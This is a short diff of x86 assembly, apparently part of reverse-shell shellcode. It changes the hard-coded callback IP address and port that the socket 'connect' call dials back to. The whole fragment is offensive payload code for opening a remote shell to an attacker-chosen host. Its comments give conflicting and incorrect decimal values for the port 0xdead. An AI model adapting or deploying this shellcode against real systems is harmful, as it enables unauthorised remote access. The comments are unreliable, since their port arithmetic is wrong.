@@ -35,8 +35,8 @@ section .text
 		
 		; connect syscall
 
-		push long 0x80020a0a 	; 10.10.2.128 in reverse order 
-		push word 0xd204	; binding port -> 0xdead = 48059 -> little endian 
+		push long 0x80aea8c0 	; IP: 192.168.174.128 in reverse order 
+		push word 0xdead	; binding port -> 0xdead= 44510 -> little endian 
 		inc bl 			; 
 		push word bx		; AF_INET
 		
